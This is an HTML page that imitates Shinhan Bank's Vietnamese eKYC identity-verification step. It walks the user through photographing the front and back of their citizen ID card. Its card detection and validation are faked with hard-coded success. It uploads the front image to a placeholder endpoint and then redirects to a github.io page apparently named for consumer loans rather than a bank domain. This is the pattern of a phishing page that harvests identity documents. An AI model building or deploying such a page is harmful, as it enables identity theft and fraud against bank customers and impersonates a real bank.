<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Shinhan Bank - Xác thực eKYC</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" href="https://shinhan.com.vn/favicon.ico" onerror="this.href='https://placehold.co/32x32/0072CE/FFFFFF?text=S'">
    <style>
        :root {
            --primary-color: #0072CE;
            --secondary-color: #F5F7FA;
            --accent-color: #00A859;
            --error-color: #D9534F;
            --text-color: #212529;
            --text-light: #6c757d;
            --border-color: #DEE2E6;
            --border-radius: 12px;
            --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        body {
            font-family: 'Be Vietnam Pro', sans-serif;
            background-color: var(--secondary-color);
            color: var(--text-color);
            line-height: 1.6;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }
        .hidden { display: none !important; }
        .app-header {
            background: #fff;
            padding: 15px 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            text-align: center;
            margin-bottom: 20px;
            position: sticky;
            top: 0;
            z-index: 1010;
        }
        .app-header img { height: 30px; }
        .back-button {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.5rem;
            color: var(--text-color);
            cursor: pointer;
        }
        .progress-bar-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 80%;
            margin: 20px auto;
            position: relative;
        }
        .progress-bar-line {
            position: absolute;
            top: 50%; left: 15%; right: 15%;
            height: 2px;
            background-color: var(--border-color);
            transform: translateY(-50%);
            z-index: 1;
        }
        .progress-bar-fill {
            position: absolute;
            top: 0; left: 0;
            height: 100%; width: 0;
            background-color: var(--primary-color);
            transition: width 0.4s ease-in-out;
        }
        .progress-step {
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 2;
            position: relative;
        }
        .step-circle {
            width: 30px; height: 30px;
            border-radius: 50%;
            background-color: #fff;
            border: 2px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            color: var(--text-light);
            transition: var(--transition);
        }
        .step-label {
            font-size: 0.8rem;
            color: var(--text-light);
            margin-top: 8px;
            transition: var(--transition);
        }
        .progress-step.active .step-circle {
            border-color: var(--primary-color);
            background-color: var(--primary-color);
            color: #fff;
        }
        .progress-step.active .step-label {
            color: var(--primary-color);
            font-weight: 600;
        }
        .progress-step.completed .step-circle {
            border-color: var(--accent-color);
            background-color: var(--accent-color);
            color: #fff;
        }
        .progress-step.completed .step-label { color: var(--text-color); }
        .content-card {
            background: white;
            padding: clamp(20px, 5vw, 40px);
            border-radius: var(--border-radius);
            box-shadow: var(--shadow);
            margin: 20px auto 120px;
            max-width: 600px;
        }
        .guide-box { text-align: center; padding: 10px; }
        .guide-box h3 {
            color: var(--text-color);
            font-weight: 700;
            margin-bottom: 20px;
        }
        .guide-examples {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-bottom: 30px;
            flex-wrap: wrap; 
        }
        .guide-example { width: 120px; }
        .guide-example img {
            width: 100%;
            height: 75px;
            border-radius: 8px;
            border: 2px solid;
            object-fit: cover;
        }
        .guide-example p { margin-top: 10px; font-weight: bold; }
        .guide-example.correct img { border-color: var(--accent-color); }
        .guide-example.correct p { color: var(--accent-color); }
        .guide-example.incorrect img { border-color: var(--error-color); }
        .guide-example.incorrect p { color: var(--error-color); }
        .guide-box ul {
            list-style: none;
            padding: 0;
            text-align: left;
            max-width: 450px;
            margin: 0 auto 30px auto;
        }
        .guide-box li {
            margin: 15px 0;
            display: flex;
            align-items: center;
            font-size: 14px;
        }
        .guide-box li i {
            color: var(--primary-color);
            margin-right: 15px;
            width: 24px;
            text-align: center;
            font-size: 18px;
        }
        .capture-box, .confirm-box {
            text-align: center;
            min-height: 400px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        .capture-box .instruction-text, .confirm-box .instruction-text {
            color: var(--text-light);
            margin-bottom: 20px;
        }
        .confirm-previews {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin: 20px 0;
        }
        .confirm-previews img {
            width: 100%;
            max-width: 300px;
            border-radius: 8px;
            margin: 0 auto;
            box-shadow: var(--shadow);
            cursor: zoom-in;
        }
        .camera-frame {
            position: relative;
            width: 100%;
            max-width: 480px;
            aspect-ratio: 1.586 / 1;
            margin: 15px auto;
            border-radius: var(--border-radius);
            overflow: hidden;
            background: #000;
        }
        .camera-frame video {
            display: none; /* Video is rendered to canvas, not shown directly */
            width: 100%; height: 100%;
            object-fit: cover;
            position: absolute; top: 0; left: 0; z-index: 0;
        }
        .camera-frame canvas {
            width: 100%; height: 100%;
            display: block; background-color: #000;
            position: relative; z-index: 1;
        }
        .camera-frame .overlay-focus {
            position: absolute; top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex; align-items: center; justify-content: center;
            z-index: 5; pointer-events: none;
        }
        .camera-frame .overlay-focus .id-card-outline {
            width: 90%; height: 90%;
            border: 3px solid rgba(255, 255, 255, 0.9);
            border-radius: 8px;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
            transition: all 0.3s ease;
            position: relative;
        }
        .id-card-outline::before, .id-card-outline::after,
        .id-card-outline > span::before, .id-card-outline > span::after {
            content: '';
            position: absolute;
            width: 30px;
            height: 30px;
            border-color: white;
            border-style: solid;
            transition: all 0.3s ease;
        }
        .id-card-outline::before { top: -3px; left: -3px; border-width: 4px 0 0 4px; border-top-left-radius: 6px; }
        .id-card-outline::after { top: -3px; right: -3px; border-width: 4px 4px 0 0; border-top-right-radius: 6px;}
        .id-card-outline > span::before { bottom: -3px; left: -3px; border-width: 0 0 4px 4px; border-bottom-left-radius: 6px;}
        .id-card-outline > span::after { bottom: -3px; right: -3px; border-width: 0 4px 4px 0; border-bottom-right-radius: 6px;}

        .camera-frame.ready-to-capture .id-card-outline,
        .camera-frame.ready-to-capture .id-card-outline::before, .camera-frame.ready-to-capture .id-card-outline::after,
        .camera-frame.ready-to-capture .id-card-outline > span::before, .camera-frame.ready-to-capture .id-card-outline > span::after {
            border-color: var(--accent-color);
        }

        .camera-frame.blink-once { animation: blink 0.5s 1; }
        @keyframes blink { 50% { box-shadow: 0 0 20px var(--primary-color); } }

        .status-message, .error-message {
            font-size: 14px;
            margin: 15px auto 5px auto;
            max-width: 480px;
            padding: 10px;
            border-radius: var(--border-radius);
            font-weight: 500;
            display: none; /* Hidden by default */
        }
        .status-message { min-height: 40px; line-height: 20px; color: var(--primary-color); }
        .error-message.visible {
            display: block;
            background-color: #f8d7da;
            color: var(--error-color);
            border: 1px solid #f5c6cb;
        }
        .loader {
            width: 48px; height: 48px;
            border: 4px solid var(--secondary-color);
            border-top: 4px solid var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .button-group {
            display: flex;
            justify-content: center;
            gap: 15px;
            flex-wrap: wrap;
            margin-top: 16px;
        }
        .btn {
            border-radius: var(--border-radius);
            padding: 14px 24px;
            font-weight: 600;
            transition: var(--transition);
            border: 1px solid transparent;
            font-size: 16px;
        }
        .btn-primary { background-color: var(--primary-color); color: white; }
        .btn-primary:hover { background-color: #005a9e; transform: translateY(-2px); color: white; }
        .btn-primary:disabled { background-color: #a0c2e0; border-color: #a0c2e0; cursor: not-allowed; transform: none; }
        .btn-primary .spinner-border { display: none; margin-right: 8px; }
        .btn-primary.is-loading .spinner-border { display: inline-block; }
        .btn-secondary { background-color: #E9ECEF; color: var(--text-color); border-color: #E9ECEF; }
        .btn-secondary:hover { background-color: #d8dde1; border-color: #d8dde1; }
        
        .capture-section .state-item { display: none; }
        .capture-section.state-capturing .state-capturing,
        .capture-section.state-loading .state-loading,
        .capture-section.state-success .state-success,
        .capture-section.state-error .state-error {
            display: block;
        }
        .capture-section.state-error .manual-capture-group,
        .capture-section.state-capturing .manual-capture-group,
        .capture-section.state-success .recapture-group,
        .capture-section.state-error .recapture-group {
            display: flex;
        }
        
        .fullscreen-modal {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: zoom-out;
        }
        .fullscreen-modal img {
            max-width: 95%;
            max-height: 95%;
            object-fit: contain;
        }
        
        @media (max-width: 600px) {
            .progress-bar-container { max-width: 90%; }
            .content-card { margin: 10px auto 80px; padding: 15px; }
        }
    </style>
</head>
<body>
    <header class="app-header">
        <i id="backButton" class="fas fa-arrow-left back-button hidden" aria-label="Quay lại trang trước"></i>
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo.png" alt="Shinhan Bank Logo" onerror="this.src='https://placehold.co/150x30/FFFFFF/0072CE?text=Shinhan+Bank'">
    </header>

    <main class="container">
        <div id="progressBarContainer" class="progress-bar-container" role="progressbar" aria-valuemin="0" aria-valuemax="2" aria-valuenow="0" aria-label="Tiến trình xác thực">
            <div class="progress-bar-line">
                <div id="progressBarFill" class="progress-bar-fill"></div>
            </div>
            <div id="step1" class="progress-step" aria-label="Bước 1: Chụp mặt trước">
                <div class="step-circle" aria-hidden="true">1</div>
                <div class="step-label">Mặt trước</div>
            </div>
            <div id="step2" class="progress-step" aria-label="Bước 2: Chụp mặt sau">
                <div class="step-circle" aria-hidden="true">2</div>
                <div class="step-label">Mặt sau</div>
            </div>
        </div>

        <div class="content-card">
            <div id="guideSection">
                <div class="guide-box">
                    <h3>Xác thực Giấy tờ tùy thân</h3>
                    <div class="guide-examples">
                        <div class="guide-example correct">
                            <img src="https://i.imgur.com/q7PIttQ.jpeg" alt="Ví dụ ảnh chụp CCCD mặt trước rõ ràng, không bị lóa hay mờ">
                            <p>Mặt trước</p>
                        </div>
                        <div class="guide-example correct">
                            <img src="https://i.imgur.com/mzBQ9t4.jpeg" alt="Ví dụ ảnh chụp CCCD mặt sau rõ ràng, không bị che khuất">
                            <p>Mặt sau</p>
                        </div>
                    </div>
                    <ul>
                        <li><i class="fas fa-image"></i> Đặt CCCD trên một mặt phẳng, màu tối.</li>
                        <li><i class="fas fa-lightbulb"></i> Đảm bảo môi trường đủ sáng, không bị lóa.</li>
                        <li><i class="fas fa-crop-alt"></i> Canh chỉnh toàn bộ giấy tờ nằm gọn trong khung hình.</li>
                        <li><i class="fas fa-mobile-alt"></i> Giữ điện thoại ổn định để ảnh không bị mờ.</li>
                    </ul>
                    <div class="button-group">
                        <button id="startCaptureBtn" class="btn btn-primary" aria-label="Bắt đầu chụp ảnh giấy tờ tùy thân" disabled>Bắt đầu chụp</button>
                    </div>
                    <p id="initStatusMessage" class="status-message mt-3" aria-live="polite"></p>
                </div>
            </div>

            <div id="captureSection" class="hidden capture-section state-capturing">
                <div class="capture-box">
                    <div>
                        <h3 id="captureTitle"></h3>
                        <p id="captureInstruction" class="instruction-text"></p>
                    </div>
                    
                    <div class="state-item state-capturing state-error">
                         <div class="camera-frame" id="cameraFrame">
                            <video id="cameraVideo" autoplay playsinline class="hidden"></video>
                            <canvas id="cameraCanvasPreview"></canvas>
                            <div class="overlay-focus">
                                <div class="id-card-outline"><span></span></div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="state-item state-loading">
                        <div id="loader" class="loader" role="status" aria-label="Đang xử lý"></div>
                    </div>
                    
                    <div class="state-item state-success text-center">
                         <i class="fas fa-check-circle fa-4x text-success my-4"></i>
                         <p class="h5">Chụp ảnh thành công!</p>
                    </div>

                    <div>
                        <p id="statusMessage" class="status-message" aria-live="polite"></p>
                        <div id="errorMessage" class="error-message" role="alert"></div>
                        <div class="button-group manual-capture-group state-item state-capturing state-error">
                            <button id="manualCaptureBtn" class="btn btn-secondary" aria-label="Chụp ảnh thủ công"><i class="fas fa-camera"></i> Chụp ảnh</button>
                        </div>
                         <div class="button-group recapture-group state-item state-success state-error">
                            <button id="recaptureBtn" class="btn btn-secondary" aria-label="Chụp lại ảnh"><i class="fas fa-redo"></i> Chụp lại</button>
                        </div>
                    </div>
                </div>
            </div>

            <div id="confirmSection" class="hidden">
                <div class="confirm-box">
                    <div>
                        <h3>Xác nhận thông tin</h3>
                        <p class="instruction-text">Vui lòng kiểm tra lại hình ảnh đã chụp.</p>
                    </div>
                    <div class="confirm-previews">
                        <img id="frontPreview" alt="Ảnh mặt trước CCCD/CMND đã chụp để xác nhận">
                        <img id="backPreview" alt="Ảnh mặt sau CCCD/CMND đã chụp để xác nhận">
                    </div>
                    <div class="button-group">
                        <button id="redoFrontBtn" class="btn btn-secondary">Chụp lại mặt trước</button>
                        <button id="redoBackBtn" class="btn btn-secondary">Chụp lại mặt sau</button>
                    </div>
                    <div class="button-group">
                        <button id="confirmFinalBtn" class="btn btn-primary w-100"><span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>Xác nhận và Hoàn tất</button>
                    </div>
                </div>
            </div>
        </div>
    </main>
    
    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5.1.0/dist/tesseract.min.js"></script>
    <script type="module">
        "use strict";

        // Main application object
        const IDCaptureApp = {
            state: {
                frontImageVerified: false,
                backImageVerified: false,
                frontImageDataUrl: null,
                backImageDataUrl: null,
                currentStream: null,
                currentCaptureType: 'front',
                isAutoCapturing: false,
                autoCaptureTimeoutId: null,
                autoCaptureMaxTimeoutId: null, 
                simulationAttempts: 0,
                isCardDetected: false,
                cameraCanvasPreview: null,
                cameraCanvasContext: null,
                animationFrameId: null,
                tesseractWorker: null,
                extractedInfo: null, // To store data from backend
            },
            elements: {},
            config: {
                AUTO_CAPTURE_INTERVAL: 2500,
                ERROR_MESSAGE_TIMEOUT: 5000,
                MAX_CAPTURE_TIMEOUT: 30000, 
                // Using a placeholder backend API URL for the simulation
                BACKEND_API_URL: 'https://httpbin.org/post',
                NEXT_STEP_URL: 'https://vaytieudung.github.io/shinhanbank/pages/vi/step3.html'
            },
            
            async init() {
                this.cacheDOMElements();
                if (!('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices)) {
                    this.showPermanentError("Trình duyệt không hỗ trợ camera.");
                    return;
                }
                this.addEventListeners();
                await this.initTesseract();
                console.log("eKYC App initialized.");
            },

            async initTesseract() {
                this.elements.startCaptureBtn.disabled = true;
                const statusMsg = this.elements.initStatusMessage;
                try {
                    statusMsg.textContent = "Đang tải mô hình nhận dạng...";
                    statusMsg.style.display = 'block';
                    this.state.tesseractWorker = await Tesseract.createWorker('vie');
                    statusMsg.textContent = "Hệ thống đã sẵn sàng!";
                    statusMsg.style.color = 'var(--accent-color)';
                    this.elements.startCaptureBtn.disabled = false;
                } catch (error) {
                    console.error("Failed to initialize Tesseract:", error);
                    statusMsg.textContent = "Lỗi tải mô hình OCR. Vui lòng thử lại.";
                    statusMsg.style.color = 'var(--error-color)';
                }
            },
            cacheDOMElements() {
                const ids = ['guideSection', 'captureSection', 'startCaptureBtn', 'cameraFrame', 'cameraVideo', 'statusMessage', 'loader', 'errorMessage', 'manualCaptureBtn', 'recaptureBtn', 'captureTitle', 'captureInstruction', 'step1', 'step2', 'progressBarFill', 'backButton', 'confirmSection', 'frontPreview', 'backPreview', 'redoFrontBtn', 'redoBackBtn', 'confirmFinalBtn', 'cameraCanvasPreview', 'progressBarContainer', 'initStatusMessage'];
                ids.forEach(id => this.elements[id] = document.getElementById(id));
                this.state.cameraCanvasPreview = this.elements.cameraCanvasPreview;
                this.state.cameraCanvasContext = this.state.cameraCanvasPreview.getContext('2d');
            },
            addEventListeners() {
                this.elements.startCaptureBtn.addEventListener('click', () => this.startCaptureProcess('front'));
                this.elements.manualCaptureBtn.addEventListener('click', () => this.triggerCapture(false));
                this.elements.recaptureBtn.addEventListener('click', () => this.startCaptureProcess(this.state.currentCaptureType));
                this.elements.backButton.addEventListener('click', () => this.cancelCapture(true));
                this.elements.redoFrontBtn.addEventListener('click', () => this.retakePhoto('front'));
                this.elements.redoBackBtn.addEventListener('click', () => this.retakePhoto('back'));
                this.elements.confirmFinalBtn.addEventListener('click', () => this.submitFinalData());
            },
            async startCaptureProcess(type) {
                if (!this.state.tesseractWorker) {
                    this.showError("Chức năng OCR chưa sẵn sàng. Vui lòng thử lại.", false);
                    return;
                }
                this.state.currentCaptureType = type;
                this.state.simulationAttempts = 0;
                this.state.isCardDetected = false;
                this.resetUIForCapture(type);
                await this.stopCamera();
                try {
                    const constraints = {
                        video: {
                            facingMode: { ideal: 'environment' },
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            torch: true,
                        }
                    };
                    console.log("Requesting camera with constraints:", constraints);
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    this.state.currentStream = stream;
                    this.elements.cameraVideo.srcObject = stream;
                    this.elements.cameraVideo.onloadedmetadata = () => {
                        const frame = this.elements.cameraFrame;
                        this.state.cameraCanvasPreview.width = frame.offsetWidth;
                        this.state.cameraCanvasPreview.height = frame.offsetHeight;
                        this.drawVideoToCanvas();
                        this.autoCaptureLoop();
                    };
                    await this.elements.cameraVideo.play();
                } catch (err) {
                    console.error("Camera access error:", err);
                    let message = "Không thể truy cập camera. Vui lòng kiểm tra quyền và thử lại.";
                    if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
                        message = "Quyền truy cập camera bị từ chối. Vui lòng vào Cài đặt trình duyệt để cấp quyền và nhấn 'Thử lại'.";
                    } else if (err.name === "NotFoundError" || err.name === "DevicesNotFoundError") {
                         message = "Không tìm thấy camera nào trên thiết bị của bạn.";
                    }
                    await this.showPermanentError(message);
                }
            },
            drawVideoToCanvas() {
                if (!this.state.currentStream || !this.state.currentStream.active) return;
                const { cameraCanvasPreview: canvas, cameraCanvasContext: context } = this.state;
                const video = this.elements.cameraVideo;
                const scale = Math.max(canvas.width / video.videoWidth, canvas.height / video.videoHeight);
                const x = (canvas.width / 2) - (video.videoWidth / 2) * scale;
                const y = (canvas.height / 2) - (video.videoHeight / 2) * scale;
                context.drawImage(video, x, y, video.videoWidth * scale, video.videoHeight * scale);
                this.state.animationFrameId = requestAnimationFrame(() => this.drawVideoToCanvas());
            },
            autoCaptureLoop() {
                if (!this.state.currentStream || !this.state.currentStream.active || this.state.isAutoCapturing) return;

                if (!this.state.autoCaptureMaxTimeoutId) {
                    this.state.autoCaptureMaxTimeoutId = setTimeout(() => {
                        if (this.state.isAutoCapturing) return;
                        this.showError("Không thể tự động chụp. Vui lòng nhấn nút 'Chụp ảnh' để thử thủ công.", false);
                        this.stopAutoCapture();
                    }, this.config.MAX_CAPTURE_TIMEOUT);
                }

                const { isValid, message, isCardDetected } = this.simulateValidation();
                this.state.isCardDetected = isCardDetected;
                this.setCameraFrameReady(isCardDetected && isValid);
                this.elements.statusMessage.textContent = message;
                this.elements.statusMessage.style.display = 'block';

                if (isCardDetected && isValid) {
                    if (!this.state.autoCaptureTimeoutId) {
                        this.state.autoCaptureTimeoutId = setTimeout(() => this.triggerCapture(true), this.config.AUTO_CAPTURE_INTERVAL);
                    }
                } else {
                    this.stopAutoCapture();
                    setTimeout(() => this.autoCaptureLoop(), 500);
                }
            },
            triggerCapture(isAuto = false) {
                if (this.state.isAutoCapturing) return;
                this.state.isAutoCapturing = true;
                this.stopAutoCapture();
                if (this.state.animationFrameId) cancelAnimationFrame(this.state.animationFrameId);
                this.toggleUIState('loading');
                this.elements.cameraFrame.classList.add('blink-once');
                setTimeout(() => this.elements.cameraFrame.classList.remove('blink-once'), 500);
                this.handleImageVerification();
            },
            async handleImageVerification() {
                const imageDataUrl = this.elements.cameraCanvasPreview.toDataURL('image/jpeg', 0.9);
                if (this.state.currentCaptureType === 'front') {
                    const ocrResult = await this.runOCR(imageDataUrl);
                    if (!ocrResult.ocrSuccess) {
                        this.handleVerificationFailure(ocrResult.message);
                        return;
                    }
                }
                const { isValid, message } = this.simulateValidationAfterCapture();
                if (isValid) this.handleVerificationSuccess(imageDataUrl);
                else this.handleVerificationFailure(message);
            },
            async runOCR(imageDataUrl) {
                if (!this.state.tesseractWorker) return { ocrSuccess: false, message: "OCR chưa sẵn sàng. Vui lòng thử lại." };
                this.elements.statusMessage.textContent = "Đang nhận dạng chữ...";
                try {
                    const optimizedImage = await this.optimizeImageForOCR(imageDataUrl);
                    const { data: { text } } = await this.state.tesseractWorker.recognize(optimizedImage);
                    console.log("On-device OCR Result (pre-check):", text);
                    if (/\b\d{12}\b/.test(text)) return { ocrSuccess: true };
                    return { ocrSuccess: false, message: "Không tìm thấy số CCCD hợp lệ. Vui lòng đảm bảo ảnh rõ nét và thử lại." };
                } catch (error) {
                    return { ocrSuccess: false, message: "Không thể nhận dạng ảnh. Vui lòng thử lại." };
                }
            },
            async optimizeImageForOCR(dataUrl) {
                return new Promise(resolve => {
                    const img = new Image();
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        const targetWidth = 800;
                        canvas.width = targetWidth;
                        canvas.height = targetWidth * (img.height / img.width);
                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                        ctx.filter = 'grayscale(100%) contrast(150%)';
                        ctx.drawImage(canvas, 0, 0); // Apply filter
                        resolve(canvas.toDataURL('image/jpeg', 0.8));
                    };
                    img.src = dataUrl;
                });
            },
            simulateValidation() {
                this.state.simulationAttempts++;
                if (this.state.simulationAttempts < 3) return { isValid: false, message: "Đang tìm kiếm giấy tờ...", isCardDetected: false };
                if (this.state.simulationAttempts < 6) return { isValid: false, message: "Đã tìm thấy. Vui lòng giữ yên...", isCardDetected: true };
                return { isValid: true, message: "Sẵn sàng chụp! Giữ máy ổn định.", isCardDetected: true };
            },
            simulateValidationAfterCapture() { return { isValid: true, message: "Ảnh hợp lệ." }; },
            handleVerificationSuccess(imageDataUrl) {
                this.state.isAutoCapturing = false;
                this.stopCamera();
                const type = this.state.currentCaptureType;
                if (type === 'front') {
                    this.state.frontImageDataUrl = imageDataUrl;
                    this.state.frontImageVerified = true;
                    this.updateProgress(1, true);
                    this.elements.statusMessage.textContent = "Chụp mặt trước thành công! Đang chuyển sang mặt sau...";
                    setTimeout(() => this.startCaptureProcess('back'), 1500);
                } else {
                    this.state.backImageDataUrl = imageDataUrl;
                    this.state.backImageVerified = true;
                    this.updateProgress(2, true);
                    this.elements.statusMessage.textContent = "Hoàn tất chụp ảnh! Vui lòng xem lại và xác nhận.";
                    setTimeout(() => this.showConfirmationScreen(), 1000);
                }
                this.triggerHapticFeedback();
                this.setCameraFrameReady(false);
            },
            handleVerificationFailure(message) {
                this.state.isAutoCapturing = false;
                this.showError(message || "Ảnh không rõ hoặc không nhận diện được. Vui lòng thử lại.", true);
                this.toggleUIState('error');
                if (this.state.currentStream) {
                    this.state.simulationAttempts = 0;
                    this.drawVideoToCanvas();
                    this.autoCaptureLoop();
                }
            },
            updateProgress(step, isComplete) {
                const totalSteps = 2;
                const progressValue = isComplete ? step : step - 0.5;
                const progressPercentage = (progressValue / totalSteps) * 100;
                this.elements.progressBarFill.style.width = `${progressPercentage}%`;
                this.elements.progressBarContainer.setAttribute('aria-valuenow', step);
                this.elements.progressBarContainer.setAttribute('aria-label', `Tiến trình xác thực: bước ${step} trên ${totalSteps} ${isComplete ? 'hoàn tất' : 'đang thực hiện'}`);
                
                this.elements.step1.className = 'progress-step';
                this.elements.step2.className = 'progress-step';
                
                if (step >= 1) {
                    this.elements.step1.classList.add(isComplete ? 'completed' : 'active');
                }
                if (step >= 2) {
                     this.elements.step1.classList.add('completed');
                     this.elements.step2.classList.add(isComplete ? 'completed' : 'active');
                }
            },
            async stopCamera() {
                if (this.state.currentStream) {
                    this.state.currentStream.getTracks().forEach(track => track.stop());
                    this.state.currentStream = null;
                }
                this.elements.cameraVideo.srcObject = null;
                this.stopAutoCapture();
                if (this.state.animationFrameId) {
                     cancelAnimationFrame(this.state.animationFrameId);
                     this.state.animationFrameId = null;
                }
                if (this.state.cameraCanvasContext) {
                     this.state.cameraCanvasContext.clearRect(0, 0, this.state.cameraCanvasPreview.width, this.state.cameraCanvasPreview.height);
                }
            },
            stopAutoCapture() { 
                if (this.state.autoCaptureTimeoutId) clearTimeout(this.state.autoCaptureTimeoutId);
                if (this.state.autoCaptureMaxTimeoutId) clearTimeout(this.state.autoCaptureMaxTimeoutId);
                this.state.autoCaptureTimeoutId = null;
                this.state.autoCaptureMaxTimeoutId = null;
            },
            showError(message, autoHide) {
                this.elements.errorMessage.textContent = message;
                this.elements.errorMessage.classList.add('visible');
                if (autoHide) setTimeout(() => this.elements.errorMessage.classList.remove('visible'), this.config.ERROR_MESSAGE_TIMEOUT);
            },
            async showPermanentError(message) {
                await this.stopCamera();
                this.elements.guideSection.innerHTML = `<div class="error-message visible" style="margin-bottom:20px;">${message}</div><button onclick="window.location.reload()" class="btn btn-primary">Thử lại</button>`;
                this.elements.guideSection.classList.remove('hidden');
                this.elements.captureSection.classList.add('hidden');
                this.elements.confirmSection.classList.add('hidden');
            },
            showConfirmationScreen() {
                this.stopCamera();
                this.elements.captureSection.classList.add('hidden');
                this.elements.confirmSection.classList.remove('hidden');
                this.elements.frontPreview.src = this.state.frontImageDataUrl;
                this.elements.backPreview.src = this.state.backImageDataUrl;
                this.elements.frontPreview.addEventListener('click', () => this.showFullScreen(this.state.frontImageDataUrl));
                this.elements.backPreview.addEventListener('click', () => this.showFullScreen(this.state.backImageDataUrl));
            },
            showFullScreen(imageDataUrl) {
                const modal = document.createElement('div');
                modal.className = 'fullscreen-modal';
                modal.innerHTML = `<img src="${imageDataUrl}" alt="Ảnh phóng to của giấy tờ tùy thân">`;
                modal.onclick = () => modal.remove();
                document.body.appendChild(modal);
            },
            
            async dataURLtoFile(dataUrl, filename) {
                const res = await fetch(dataUrl);
                const blob = await res.blob();
                return new File([blob], filename, { type: blob.type });
            },
            async submitFinalData() {
                const btn = this.elements.confirmFinalBtn;
                btn.disabled = true;
                btn.classList.add('is-loading');

                try {
                    console.log("Preparing data to send to backend...");
                    const frontImageFile = await this.dataURLtoFile(this.state.frontImageDataUrl, 'front_card.jpg');
                    
                    const formData = new FormData();
                    formData.append('file', frontImageFile);

                    console.log(`Sending image to API: ${this.config.BACKEND_API_URL}`);
                    
                    const response = await fetch(this.config.BACKEND_API_URL, {
                        method: 'POST',
                        body: formData,
                    });

                    if (!response.ok) {
                        const errorData = await response.json().catch(() => ({})); // Handle cases where body is not JSON
                        throw new Error(errorData.error || `Server error: ${response.statusText}`);
                    }
                    
                    const resultData = await response.json();
                    
                    console.log("--- SIMULATED RESULT FROM BACKEND ---");
                    console.log(resultData);
                    
                    this.state.extractedInfo = resultData;

                    // Redirect to the next step on success
                    window.location.href = this.config.NEXT_STEP_URL;

                } catch (err) {
                    console.error("Error sending data to backend:", err);
                    this.showError(`Không thể kết nối đến server xử lý. Vui lòng thử lại.`, false);
                    btn.disabled = false;
                    btn.classList.remove('is-loading');
                }
            },
            retakePhoto(type) {
                this.elements.confirmSection.classList.add('hidden');
                if (type === 'front') {
                    this.state.frontImageVerified = false;
                    this.state.frontImageDataUrl = null;
                } else {
                    this.state.backImageVerified = false;
                    this.state.backImageDataUrl = null;
                }
                this.startCaptureProcess(type);
            },
            cancelCapture() {
                this.stopCamera();
                this.elements.captureSection.classList.add('hidden');
                this.elements.confirmSection.classList.add('hidden');
                this.elements.guideSection.classList.remove('hidden');
                this.elements.backButton.classList.add('hidden');
                this.updateProgress(0, false);
            },
            resetUIForCapture(type) {
                this.elements.guideSection.classList.add('hidden');
                this.elements.confirmSection.classList.add('hidden');
                this.elements.captureSection.classList.remove('hidden');
                this.elements.backButton.classList.remove('hidden');
                this.elements.captureSection.className = `capture-section state-capturing`;
                this.elements.captureTitle.textContent = `Chụp ${type === 'front' ? 'mặt trước' : 'mặt sau'} CCCD/CMND`;
                this.elements.captureInstruction.textContent = `Vui lòng đặt ${type === 'front' ? 'mặt trước' : 'mặt sau'} CCCD/CMND vào khung hình.`;
                this.updateProgress(type === 'front' ? 1 : 2, false);
                this.setCameraFrameReady(false);
                this.elements.errorMessage.classList.remove('visible');
                this.elements.statusMessage.style.display = 'none';
            },
            setCameraFrameReady(isReady) { this.elements.cameraFrame.classList.toggle('ready-to-capture', isReady); },
            triggerHapticFeedback() { if (navigator.vibrate) navigator.vibrate(50); },
            toggleUIState(state) {
                this.elements.captureSection.className = `capture-section state-${state}`;
                const msg = this.elements.statusMessage;
                if(msg) {
                    msg.style.display = 'block';
                    if (state === 'success') msg.textContent = `Đã lưu ảnh ${this.state.currentCaptureType === 'front' ? 'mặt trước' : 'mặt sau'}.`;
                    else if (state === 'loading') msg.textContent = "Đang xử lý...";
                    else if (state === 'capturing' || state === 'error') msg.textContent = ""; // Hide status when showing an error or just capturing
                    else msg.textContent = "";
                }
            }
        };

        document.addEventListener('DOMContentLoaded', () => IDCaptureApp.init());
    </script>
</body>
</html>
